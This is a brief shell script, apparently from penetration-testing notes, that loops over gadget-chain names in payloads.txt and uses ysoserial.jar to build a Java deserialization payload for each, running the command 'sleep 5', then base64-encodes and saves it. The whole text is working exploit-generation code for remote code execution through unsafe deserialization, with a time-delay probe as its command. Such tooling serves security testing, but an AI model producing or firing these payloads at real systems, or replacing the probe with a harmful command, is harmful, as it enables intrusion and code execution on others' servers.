while read payload; 
do echo "$payload\n\n"; 
java -jar ysoserial.jar $payload "sleep 5" | base64 | tr -d '\n' > $payload.ser; 
echo "-----------------Loading-----------------\n\n"; done < payloads.txt
